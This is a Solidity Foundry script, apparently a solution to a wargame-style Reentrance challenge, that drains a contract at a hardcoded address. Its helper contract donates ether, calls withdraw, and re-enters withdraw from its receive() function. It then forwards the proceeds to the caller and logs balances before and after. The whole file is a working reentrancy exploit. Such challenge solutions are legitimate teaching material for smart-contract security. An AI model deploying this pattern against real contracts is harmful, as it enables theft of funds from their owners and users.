// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface Reentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract Ex {
    Reentrance public reentrance_ = Reentrance(payable(0x27D1Ee7FAbAb5Ec5d8a2Aa7384967501B511B54D));

    constructor() public payable {
        reentrance_.donate{value: 0.001 ether}(address(this));
    }

    function ex() external {
        reentrance_.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentrance_.withdraw(0.001 ether);
    }
}

contract ReentranceSol is Script {
    Reentrance public reentrance_ = Reentrance(payable(0x27D1Ee7FAbAb5Ec5d8a2Aa7384967501B511B54D));

    function run() external {
        vm.startBroadcast();

        console.log("Before instance balances: ", address(reentrance_).balance);
        Ex ex = new Ex{value: 0.001 ether}();
        ex.ex();
        console.log("After instance balances:  ", address(reentrance_).balance);

        vm.stopBroadcast();
    }
}